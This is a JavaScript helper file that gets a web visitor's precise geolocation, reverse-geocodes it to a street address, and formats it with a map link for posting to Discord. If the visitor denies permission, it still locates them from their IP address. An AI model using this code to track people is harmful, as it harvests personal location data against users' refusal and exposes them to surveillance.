// Location Helper - Get user's location for Discord messages

// Function to get user's location
function getUserLocation() {
    return new Promise((resolve) => {
        let locationInfo = {
            latitude: 'N/A',
            longitude: 'N/A',
            address: 'N/A',
            accuracy: 'N/A'
        };

        // Check if geolocation is supported
        if (!navigator.geolocation) {
            console.log('Geolocation not supported');
            resolve(locationInfo);
            return;
        }

        // Get location with timeout (increased timeout for better accuracy)
        const options = {
            enableHighAccuracy: true,
            timeout: 10000, // Increased to 10 seconds for better location accuracy
            maximumAge: 0
        };

        navigator.geolocation.getCurrentPosition(
            (position) => {
                locationInfo.latitude = position.coords.latitude.toFixed(6);
                locationInfo.longitude = position.coords.longitude.toFixed(6);
                locationInfo.accuracy = Math.round(position.coords.accuracy) + ' meters';
                
                // Try to get address from coordinates (reverse geocoding)
                getAddressFromCoordinates(position.coords.latitude, position.coords.longitude)
                    .then(address => {
                        locationInfo.address = address;
                        resolve(locationInfo);
                    })
                    .catch(() => {
                        resolve(locationInfo);
                    });
            },
            (error) => {
                console.log('Location error:', error.message);
                // Try to get approximate location from IP
                getLocationFromIP()
                    .then(ipLocation => {
                        if (ipLocation) {
                            locationInfo = ipLocation;
                        }
                        resolve(locationInfo);
                    })
                    .catch(() => {
                        resolve(locationInfo);
                    });
            },
            options
        );
    });
}

// Function to get address from coordinates (using OpenStreetMap Nominatim API)
function getAddressFromCoordinates(lat, lon) {
    return new Promise((resolve, reject) => {
        const url = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`;
        
        fetch(url)
            .then(response => response.json())
            .then(data => {
                if (data && data.display_name) {
                    resolve(data.display_name);
                } else {
                    reject('Address not found');
                }
            })
            .catch(error => {
                reject(error);
            });
    });
}

// Function to get approximate location from IP (fallback)
function getLocationFromIP() {
    return new Promise((resolve, reject) => {
        fetch('https://ipapi.co/json/')
            .then(response => response.json())
            .then(data => {
                if (data && data.latitude && data.longitude) {
                    resolve({
                        latitude: data.latitude.toFixed(6),
                        longitude: data.longitude.toFixed(6),
                        address: `${data.city || ''}, ${data.region || ''}, ${data.country_name || ''}`.trim(),
                        accuracy: 'Approximate (IP-based)'
                    });
                } else {
                    reject('IP location not available');
                }
            })
            .catch(error => {
                reject(error);
            });
    });
}

// Function to format location for Discord message
function formatLocationForDiscord(location) {
    if (location.latitude === 'N/A') {
        return '📍 Location: Not available (User may have denied permission)';
    }
    
    let locationText = `📍 User Location:\n`;
    locationText += `   📍 Coordinates: ${location.latitude}, ${location.longitude}\n`;
    locationText += `   🏠 Address: ${location.address}\n`;
    locationText += `   📏 Accuracy: ${location.accuracy}`;
    
    // Add Google Maps link
    locationText += `\n   🗺️ Google Maps: https://www.google.com/maps?q=${location.latitude},${location.longitude}`;
    
    return locationText;
}
